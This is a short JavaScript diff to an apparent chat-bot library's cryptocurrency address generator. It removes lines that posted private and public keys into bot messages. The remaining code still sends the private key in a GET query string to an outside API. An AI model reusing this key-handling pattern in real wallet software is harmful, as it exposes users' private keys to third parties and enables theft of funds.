@@ -52,15 +52,12 @@ function Pricee(){
 
 function generateAddress(currency){
  let devkeys = loadKey();
-  let prikey = devkeys.publicKey
-  Bot.sendMessage(prikey)
-  let pubkey = devkeys.privateKey
-  Bot.sendMessage(pubkey)
+  let prikey = devkeys.privateKey
+  let pubkey = devkeys.publicKey
  if(!currency){
 Bot.sendMessage('Use : `generateAddress("TRX");`');
  return
 }
-  Bot.sendMessage(""+build_api_url+"/?PrivateKey="+prikey+"&PublicKey="+pubkey+"&Currency="+currency+"")
  HTTP.get({
   url:""+build_api_url+"/?PrivateKey="+prikey+"&PublicKey="+pubkey+"&Currency="+currency+"",
   success: libPrefix + 'Generatee'
